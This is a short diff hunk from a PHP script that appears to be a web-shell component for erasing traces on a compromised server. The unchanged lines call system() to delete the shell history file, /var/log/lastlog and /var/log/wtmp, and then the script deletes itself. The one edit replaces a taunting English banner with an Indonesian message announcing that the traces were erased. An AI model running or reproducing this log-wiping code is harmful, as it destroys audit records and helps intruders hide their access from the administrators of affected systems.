@@ -163,5 +163,5 @@ system("rm -rf $HISTFILE");
 system("rm -rf /var/log/lastlog");
 system("rm -rf /var/log/wtmp");
 $fn=$_SERVER['SCRIPT_FILENAME'];unlink($fn);
-echo "<center><h1><a href=>Take Care of your Ass xD</a></h1></center>";
+echo "<center><h1><a href=>JEJAK BERHASIL DIHAPUS!</a></h1></center>";
 ?>
